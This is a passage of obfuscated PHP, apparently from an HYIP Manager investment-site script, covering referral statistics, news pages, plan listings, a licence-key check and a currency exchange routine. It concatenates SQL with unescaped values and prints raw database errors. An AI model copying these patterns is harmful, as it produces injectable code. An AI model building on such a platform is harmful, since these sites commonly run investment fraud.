                                                                $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] = date ('j', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                                                                $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] = date ('n', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                                                                $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] = date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                                                                $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] = $elnlcsyENS['elnlctNxTK'];
                                                                $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] = $elnlcWodOE[$elnlcsyENS['elnlcmEWD']];
                                                                $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] = $elnlcWodOE[$elnlcsyENS['elnlcMeCs']];
                                                              }

                                                              $elnlckeTje = '\'' . $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] . '\' + interval 0 day < date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour and ' . '\'' . $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] . '\' + interval 1 day > date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour and';
                                                              $elnlcdRCR = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcsyENS['elnlctqSz']);
                                                              $elnlcfhFg->assign ('month', $elnlcdRCR);
                                                              $elnlcRaue = array ();
                                                              for ($i = $elnlcsyENS['elnlctNxTK']; $i <= 31; ++$i)
                                                              {
                                                                array_push ($elnlcRaue, $i);
                                                              }

                                                              $elnlcfhFg->assign ('day', $elnlcRaue);
                                                              $elnlczLFnQ = array ();
                                                              for ($i = $elnlcSuVc[$elnlcsyENS['elnlcArER']]; $i <= date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60); ++$i)
                                                              {
                                                                array_push ($elnlczLFnQ, $i);
                                                              }

                                                              $elnlcfhFg->assign ('year', $elnlczLFnQ);
                                                              $elnlcfhFg->assign ('frm', $elnlcWodOE);
                                                              $q = 'select *, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y\') as date from hm2_referal_stats where ' . $elnlckeTje . ' user_id = ') . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                              $elnlchGkPU = mysql_query ($q);
                                                              $elnlcfvBI = array ();
                                                              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                              {
                                                                array_push ($elnlcfvBI, $elnlcCgqPK);
                                                                $elnlcfhFg->assign ('show_refstat', 1);
                                                              }

                                                              $elnlcfhFg->assign ('refstat', $elnlcfvBI);
                                                              $elnlcSecB = $elnlcsyENS['elnlcmjUx'];
                                                              $elnlckceBd = $elnlcsyENS['elnlcmjUx'];
                                                              $q = 'select * from hm2_users where ref = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' order by id desc';
                                                              $elnlchGkPU = mysql_query ($q);
                                                              $elnlcwgOR = array ();
                                                              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                              {
                                                                $q = 'select count(*) as col from hm2_deposits where user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                                                                ($elnlcSrlye = mysql_query ($q) OR print mysql_error ());
                                                                while ($elnlcggjo = mysql_fetch_array ($elnlcSrlye))
                                                                {
                                                                  $elnlcCgqPK[q_deposits] = $elnlcggjo[col];
                                                                }

                                                                $elnlcJqFzt = array ($elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
                                                                $elnlcQRWs = array ();
                                                                $i = $elnlcsyENS['elnlcmjUx'];
                                                                for ($i = $elnlcsyENS['elnlcbpKgI']; $i < 11; ++$i)
                                                                {
                                                                  $elnlcqaeO = join (',', $elnlcJqFzt);
                                                                  $elnlcxqpHq = $elnlcsyENS['elnlcmjUx'];
                                                                  $q = '' . 'select id from hm2_users where ref in (' . $elnlcqaeO . ')';
                                                                  $elnlcjSNE = mysql_query ($q);
                                                                  $elnlcJqFzt = array ();
                                                                  while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                                                  {
                                                                    array_push ($elnlcJqFzt, $elnlcUpbus[$elnlcsyENS['elnlcLbvLL']]);
                                                                    $q = 'select count(*) as col from hm2_deposits where user_id = ' . $elnlcUpbus[$elnlcsyENS['elnlcLbvLL']];
                                                                    ($elnlcSrlye = mysql_query ($q) OR print mysql_error ());
                                                                    while ($elnlcggjo = mysql_fetch_array ($elnlcSrlye))
                                                                    {
                                                                      $elnlcmiCxm = $elnlcggjo[col];
                                                                    }

                                                                    if (0 < $elnlcmiCxm)
                                                                    {
                                                                      ++$elnlcSecB;
                                                                      ++$elnlcxqpHq;
                                                                    }

                                                                    ++$elnlckceBd;
                                                                  }

                                                                  if (!$elnlcJqFzt)
                                                                  {
                                                                    break;
                                                                  }

                                                                  array_push ($elnlcQRWs, array ('level' => $i - 1, 'cnt' => sizeof ($elnlcJqFzt), 'cnt_active' => $elnlcxqpHq));
                                                                }

                                                                $elnlcCgqPK[$elnlcsyENS['elnlcQjMW']] = $elnlcQRWs;
                                                                array_push ($elnlcwgOR, $elnlcCgqPK);
                                                                $elnlcfhFg->assign ('show_referals', 1);
                                                              }

                                                              $elnlcfhFg->assign ('referals', $elnlcwgOR);
                                                              $elnlcfhFg->assign ('cnt_other_active', $elnlcSecB);
                                                              $elnlcfhFg->assign ('cnt_other', $elnlckceBd);
                                                              $q = 'select * from hm2_users where id = ' . $elnlcgcnET[$elnlcsyENS['elnlckGUEd']];
                                                              $elnlchGkPU = mysql_query ($q);
                                                              $elnlcUpbus = mysql_fetch_array ($elnlchGkPU);
                                                              $elnlcmjbW = $elnlcUpbus;
                                                              $elnlcfhFg->assign ('upline', $elnlcmjbW);
                                                              $elnlcfhFg->display ($elnlcsyENS['elnlcECzCn']);
                                                              print base64_decode ('Cg==
');
                                                            }
                                                            else
                                                            {
                                                              if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcrHih'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                                              {
                                                                if ((($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] != '5MTHEA3YPUTD6CDJ9LSP' AND $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] != 'TA4B6KRBLRG85GM4A3SF') AND $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] != '4ZQQN55VA2NXBVFUQJE6'))
                                                                {
                                                                  exit ();
                                                                }

                                                                if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlczIGz'])
                                                                {
                                                                  if ($elnlcWodOE[$elnlcsyENS['elnlcdlRdh']] == $elnlcgcnET[$elnlcsyENS['elnlcOamyf']])
                                                                  {
                                                                    $elnlcRuFoK = array ();
                                                                    $elnlcRuFoK[$elnlcsyENS['elnlcAIMpf']] = $elnlcgcnET[$elnlcsyENS['elnlcAIMpf']];
                                                                    $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
                                                                    elnlcsius ('transaction_code_recovery', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                                                                    $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcCWSFH']);
                                                                  }
                                                                  else
                                                                  {
                                                                    $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcNyJP']);
                                                                  }
                                                                }

                                                                $elnlcfhFg->display ($elnlcsyENS['elnlcUwoD']);
                                                                print base64_decode ('Cg==
');
                                                              }
                                                              else
                                                              {
                                                                if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcuUPS'])
                                                                {
                                                                  $elnlcgPjjO = '';
                                                                  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
                                                                  {
                                                                    if (0 < $elnlcgcnET[id])
                                                                    {
                                                                      $elnlcgPjjO = '' . ' where lang = ' . $elnlcgcnET[$elnlcsyENS['elnlcuQjiT']] . ' and private in (1, 0) ';
                                                                    }
                                                                    else
                                                                    {
                                                                      $elnlcgPjjO = ' where lang = 1 and private = 0 ';
                                                                    }
                                                                  }

                                                                  $elnlcuDBgs = intval ($elnlcWodOE[$elnlcsyENS['elnlcLbvLL']]);
                                                                  if (0 < $elnlcuDBgs)
                                                                  {
                                                                    $q = 'select *, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y %r\') as d from hm2_news where id = ' . $elnlcuDBgs);
                                                                    $elnlchGkPU = mysql_query ($q);
                                                                    $elnlcrczw = mysql_fetch_assoc ($elnlchGkPU);
                                                                    if ($elnlcrczw)
                                                                    {
                                                                      if ($elnlcrczw[$elnlcsyENS['elnlcMoSVM']] == '')
                                                                      {
                                                                        $elnlcrczw[$elnlcsyENS['elnlcMoSVM']] = $elnlcrczw[$elnlcsyENS['elnlcDuyqU']];
                                                                      }

                                                                      $elnlcrczw[$elnlcsyENS['elnlcMoSVM']] = preg_replace ('/
/', '<br>', $elnlcrczw[$elnlcsyENS['elnlcMoSVM']]);
                                                                      $elnlcfhFg->assign ('news', $elnlcrczw);
                                                                      $elnlcfhFg->assign ('nid', $elnlcuDBgs);
                                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcfigFf']);
                                                                      exit ();
                                                                    }
                                                                  }

                                                                  $q = '' . 'select count(*) as c_all from hm2_news ' . $elnlcgPjjO;
                                                                  ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                  $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                                  $elnlcrldqi = $elnlcCgqPK[$elnlcsyENS['elnlcKrRIE']];
                                                                  $elnlcBVch = $elnlcWodOE[$elnlcsyENS['elnlcoRdoK']];
                                                                  $elnlcnAdtA = $elnlcsyENS['elnlcUKVo'];
                                                                  $elnlcfKwd = ceil ($elnlcrldqi / $elnlcnAdtA);
                                                                  if ($elnlcBVch <= 1)
                                                                  {
                                                                    $elnlcBVch = $elnlcsyENS['elnlctNxTK'];
                                                                  }

                                                                  if (($elnlcfKwd < $elnlcBVch AND 1 < $elnlcfKwd))
                                                                  {
                                                                    $elnlcBVch = $elnlcfKwd;
                                                                  }

                                                                  $elnlcQVmJ = ($elnlcBVch - 1) * $elnlcnAdtA;
                                                                  $q = 'select 
                 *,
                 date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y %r\') as d
           from 
                 hm2_news 
           ' . $elnlcgPjjO . '
           order by 
                 date desc
           limit 
                 ' . $elnlcQVmJ . ', ' . $elnlcnAdtA);
                                                                  ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                  $elnlcrczw = array ();
                                                                  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                  {
                                                                    if ($elnlcCgqPK[$elnlcsyENS['elnlcMoSVM']] == '')
                                                                    {
                                                                      $elnlcCgqPK[$elnlcsyENS['elnlcMoSVM']] = $elnlcCgqPK[$elnlcsyENS['elnlcDuyqU']];
                                                                    }

                                                                    $elnlcCgqPK[$elnlcsyENS['elnlcMoSVM']] = preg_replace ('/
/', '<br>', $elnlcCgqPK[$elnlcsyENS['elnlcMoSVM']]);
                                                                    array_push ($elnlcrczw, $elnlcCgqPK);
                                                                  }

                                                                  $elnlcfhFg->assign ('news', $elnlcrczw);
                                                                  $elnlcdwLbF = array ();
                                                                  for ($i = $elnlcsyENS['elnlctNxTK']; $i <= $elnlcfKwd; ++$i)
                                                                  {
                                                                    $elnlcyNBa = array ();
                                                                    $elnlcyNBa[$elnlcsyENS['elnlcoRdoK']] = $i;
                                                                    $elnlcyNBa[$elnlcsyENS['elnlcCdoEa']] = ($i == $elnlcBVch ? 1 : 0);
                                                                    array_push ($elnlcdwLbF, $elnlcyNBa);
                                                                  }

                                                                  $elnlcfhFg->assign ('pages', $elnlcdwLbF);
                                                                  $elnlcfhFg->assign ('colpages', $elnlcfKwd);
                                                                  $elnlcfhFg->assign ('current_page', $elnlcBVch);
                                                                  if (1 < $elnlcBVch)
                                                                  {
                                                                    $elnlcfhFg->assign ('prev_page', $elnlcBVch - 1);
                                                                  }

                                                                  if ($elnlcBVch < $elnlcfKwd)
                                                                  {
                                                                    $elnlcfhFg->assign ('next_page', $elnlcBVch + 1);
                                                                  }

                                                                  $elnlcfhFg->display ($elnlcsyENS['elnlcfigFf']);
                                                                }
                                                                else
                                                                {
                                                                  if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcRwBLi'])
                                                                  {
                                                                    $elnlckapu = intval ($elnlcWodOE[$elnlcsyENS['elnlcsMIe']]);
                                                                    $elnlczhuc = array ();
                                                                    $q = 'select *, 
               date_format(now() + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour, \'%m/%d/%Y\') as from_date,
               date_format((now() + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour) + interval q_days day, \'%m/%d/%Y\') as to_date
        from hm2_types where id = ' . $elnlckapu);
                                                                    if (!($elnlchGkPU = mysql_query ($q)))
                                                                    {
                                                                      exit (mysql_error ());
                                                                      (bool)true;
                                                                    }

                                                                    $elnlcjOPb = mysql_fetch_array ($elnlchGkPU);
                                                                    if (!$elnlcjOPb)
                                                                    {
                                                                      $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcywaB']);
                                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcFBKC']);
                                                                      exit ();
                                                                    }

                                                                    $i = $elnlcsyENS['elnlcmjUx'];
                                                                    $q = '' . 'select * from hm2_plans where parent = ' . $elnlckapu . ' order by id';
                                                                    if (!($elnlchGkPU = mysql_query ($q)))
                                                                    {
                                                                      exit (mysql_error ());
                                                                      (bool)true;
                                                                    }

                                                                    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                    {
                                                                      $elnlcCgqPK[$elnlcsyENS['elnlcQUDp']] = $i;
                                                                      ++$i;
                                                                      array_push ($elnlczhuc, $elnlcCgqPK);
                                                                    }

                                                                    $elnlcfhFg->assign ('plans', $elnlczhuc);
                                                                    if (($elnlcjOPb[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcaeKEf'] AND $elnlcjOPb[$elnlcsyENS['elnlcqCEH']]))
                                                                    {
                                                                      $elnlcjOPb[$elnlcsyENS['elnlcdryi']] = 'w-d';
                                                                    }

                                                                    $elnlcweII = array ('w-d' => 'Work Days', 'd' => 'Days', 'w' => 'Weeks', 'b-w' => 'Bi Weeks', 'm' => 'Months', '2m' => 'Bi-Months', '3m' => '3 Months', '6m' => '6 Months', 'y' => 'Years', 'h' => $elnlcsyENS['elnlcCxJr']);
                                                                    $elnlcjOPb[$elnlcsyENS['elnlcUJRV']] = $elnlcweII[$elnlcjOPb[$elnlcsyENS['elnlcdryi']]];
                                                                    $elnlcjOPb[$elnlcsyENS['elnlcwFTQ']] = $elnlczhuc[0][min_deposit];
                                                                    $elnlcfhFg->assign ('type', $elnlcjOPb);
                                                                    if ($elnlcjOPb[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcBEDou'])
                                                                    {
                                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcFBKC']);
                                                                    }
                                                                    else
                                                                    {
                                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcVIzRs']);
                                                                    }
                                                                  }
                                                                  else
                                                                  {
                                                                    if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcJmFM'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                                                    {
                                                                      $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                                      if ($elnlcWodOE[$elnlcsyENS['elnlcsVmv']] == $elnlcsyENS['elnlcvncu'])
                                                                      {
                                                                        $elnlcfhFg->assign ('exchanged', 1);
                                                                        $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                        exit ();
                                                                      }

                                                                      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcmBEiE'])
                                                                      {
                                                                        $elnlcQVmJ = intval ($elnlcWodOE[$elnlcsyENS['elnlcTBIJb']]);
                                                                        $q = '' . 'select sum(actual_amount) as sm from hm2_history where user_id = ' . $elnlckapu . ' and ec = ' . $elnlcQVmJ;
                                                                        $elnlchGkPU = mysql_query ($q);
                                                                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                                        $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] = floor ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] * 100) / 100;
                                                                        if ((!isset ($elnlcGPfS[$elnlcQVmJ]) OR ($elnlcGPfS[$elnlcQVmJ][$elnlcsyENS['elnlccotiB']] != 1 AND $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] <= 0)))
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcfHqGh']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $elnlcVdPU = intval ($elnlcWodOE['' . 'to_' . $elnlcQVmJ]);
                                                                        if (((($elnlcWodOE['to'] === '' OR !isset ($elnlcGPfS[$elnlcVdPU])) OR $elnlcGPfS[$elnlcVdPU][$elnlcsyENS['elnlccotiB']] != 1) OR $elnlcVdPU == $elnlcQVmJ))
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcWUac']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $elnlcWodOE['' . 'amount_' . $elnlcQVmJ] = str_replace (',', '.', $elnlcWodOE['' . 'amount_' . $elnlcQVmJ]);
                                                                        $elnlcrUqv = sprintf ('%.02f', $elnlcWodOE['' . 'amount_' . $elnlcQVmJ]);
                                                                        if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                                                                        {
                                                                          $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and hm2_deposits.deposit_date + interval hm2_types.hold day > now()';
                                                                        }
                                                                        else
                                                                        {
                                                                          $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id ';
                                                                        }

                                                                        ($elnlceJyT = mysql_query ($q) OR print mysql_error ());
                                                                        $elnlcadsc = array ();
                                                                        $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                                                                        $elnlcEEGK = $elnlcsyENS['elnlcmjUx'];
                                                                        while ($elnlcsbvLG = mysql_fetch_array ($elnlceJyT))
                                                                        {
                                                                          $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlcQVmJ . ' and 
		deposit_id = ' . $elnlcsbvLG[id] . ' and date > now() - interval ' . $elnlcsbvLG[hold] . ' day and 
			(type=\'earning\' or 
		(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));');
                                                                          ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                                                                          while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                                                          {
                                                                            $elnlcEEGK += $elnlcUpbus[amount];
                                                                          }
                                                                        }

                                                                        if ($elnlcrUqv <= 0)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcWoxss']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        if ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] < $elnlcrUqv)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlclULfv']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        if ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] - $elnlcEEGK < $elnlcrUqv)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcMbCSk']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $q = '' . 'select * from hm2_exchange_rates where sfrom = ' . $elnlcQVmJ . ' and sto = ' . $elnlcVdPU;
                                                                        $elnlchGkPU = mysql_query ($q);
                                                                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                                        $elnlcTjnV = $elnlcCgqPK[$elnlcsyENS['elnlcOhvjC']];
                                                                        $elnlcTjnV /= 100;
                                                                        if (1 <= $elnlcTjnV)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcROkr']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $elnlcRLcG = sprintf ('%.02f', (1 - $elnlcTjnV) * $elnlcrUqv);
                                                                        if ($elnlcRLcG <= 0)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcFxME']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $elnlcfhFg->assign ('from', $elnlcQVmJ);
                                                                        $elnlcfhFg->assign ('from_name', $elnlcGPfS[$elnlcQVmJ][$elnlcsyENS['elnlcmjdk']]);
                                                                        $elnlcfhFg->assign ('to', $elnlcVdPU);
                                                                        $elnlcfhFg->assign ('to_name', $elnlcGPfS[$elnlcVdPU][$elnlcsyENS['elnlcmjdk']]);
                                                                        $elnlcfhFg->assign ('amount', $elnlcrUqv);
                                                                        $elnlcfhFg->assign ('exchange_amount', $elnlcRLcG);
                                                                        $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                        exit ();
                                                                      }

                                                                      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcJmFM'])
                                                                      {
                                                                        $elnlcQVmJ = intval ($elnlcWodOE[$elnlcsyENS['elnlcTBIJb']]);
                                                                        $q = '' . 'select sum(actual_amount) as sm from hm2_history where user_id = ' . $elnlckapu . ' and ec = ' . $elnlcQVmJ;
                                                                        $elnlchGkPU = mysql_query ($q);
                                                                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                                        $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] = floor ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] * 100) / 100;
                                                                        if ((!isset ($elnlcGPfS[$elnlcQVmJ]) OR ($elnlcGPfS[$elnlcQVmJ][$elnlcsyENS['elnlccotiB']] != 1 AND $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] <= 0)))
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcfHqGh']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $elnlcVdPU = intval ($elnlcWodOE['to']);
                                                                        if ((($elnlcWodOE['to'] == '' OR !isset ($elnlcGPfS[$elnlcVdPU])) OR $elnlcGPfS[$elnlcVdPU][$elnlcsyENS['elnlccotiB']] != 1))
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcWUac']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $elnlcrUqv = sprintf ('%.02f', $elnlcWodOE['amount']);
                                                                        if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                                                                        {
                                                                          $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and hm2_deposits.deposit_date + interval hm2_types.hold day > now()';
                                                                        }
                                                                        else
                                                                        {
                                                                          $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id ';
                                                                        }

                                                                        ($elnlceJyT = mysql_query ($q) OR print mysql_error ());
                                                                        $elnlcadsc = array ();
                                                                        $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                                                                        $elnlcEEGK = $elnlcsyENS['elnlcmjUx'];
                                                                        while ($elnlcsbvLG = mysql_fetch_array ($elnlceJyT))
                                                                        {
                                                                          $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlcQVmJ . ' and 
		deposit_id = ' . $elnlcsbvLG[id] . ' and date > now() - interval ' . $elnlcsbvLG[hold] . ' day and 
			(type=\'earning\' or 
		(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));');
                                                                          ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                                                                          while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                                                          {
                                                                            $elnlcEEGK += $elnlcUpbus[amount];
                                                                          }
                                                                        }

                                                                        if ($elnlcrUqv <= 0)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcWoxss']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        if ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] < $elnlcrUqv)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlclULfv']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        if ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] - $elnlcEEGK < $elnlcrUqv)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcMbCSk']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $q = '' . 'select * from hm2_exchange_rates where sfrom = ' . $elnlcQVmJ . ' and sto = ' . $elnlcVdPU;
                                                                        $elnlchGkPU = mysql_query ($q);
                                                                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                                        $elnlcTjnV = $elnlcCgqPK[$elnlcsyENS['elnlcOhvjC']];
                                                                        $elnlcTjnV /= 100;
                                                                        if (1 <= $elnlcTjnV)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcROkr']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $elnlcRLcG = sprintf ('%.02f', (1 - $elnlcTjnV) * $elnlcrUqv);
                                                                        if ($elnlcRLcG <= 0)
                                                                        {
                                                                          $elnlcfhFg->assign ('error', $elnlcsyENS['elnlcFxME']);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcsgsp']);
                                                                          exit ();
                                                                        }

                                                                        $elnlcuIgHl = $elnlcGPfS[$elnlcQVmJ][$elnlcsyENS['elnlcmjdk']];
                                                                        $elnlcgFcxp = $elnlcGPfS[$elnlcVdPU][$elnlcsyENS['elnlcmjdk']];
                                                                        $q = '' . 'insert into hm2_history set
             user_id = ' . $elnlckapu . ',
             amount = -' . $elnlcrUqv . ',
             actual_amount = -' . $elnlcrUqv . ',
             date = now(),
             type = \'exchange_in\',
             description = \'Send ' . $elnlcSuVc[currency_sign] . ('' . $elnlcrUqv . ' ' . $elnlcuIgHl . ' to ' . $elnlcgFcxp . '\',
             ec = ' . $elnlcQVmJ . '
          ');
                                                                        mysql_query ($q);
                                                                        $q = '' . 'insert into hm2_history set
             user_id = ' . $elnlckapu . ',
             amount = ' . $elnlcRLcG . ',
             actual_amount = ' . $elnlcRLcG . ',
             date = now(),
             type = \'exchange_out\',
             description = \'Receive ' . $elnlcSuVc[currency_sign] . ('' . $elnlcRLcG . ' ' . $elnlcgFcxp . ' from ' . $elnlcuIgHl . '\',
             ec = ' . $elnlcVdPU . '
          ');
                                                                        mysql_query ($q);
                                                                        $elnlcRuFoK = array ();
                                                                        $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
                                                                        $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
                                                                        $elnlcRuFoK[$elnlcsyENS['elnlcJgHnx']] = $elnlcGPfS[$elnlcQVmJ][$elnlcsyENS['elnlcmjdk']];
                                                                        $elnlcRuFoK[$elnlcsyENS['elnlcvHokd']] = number_format ($elnlcrUqv, 2);
                                                                        $elnlcRuFoK[$elnlcsyENS['elnlcfgSDy']] = $elnlcGPfS[$elnlcVdPU][$elnlcsyENS['elnlcmjdk']];
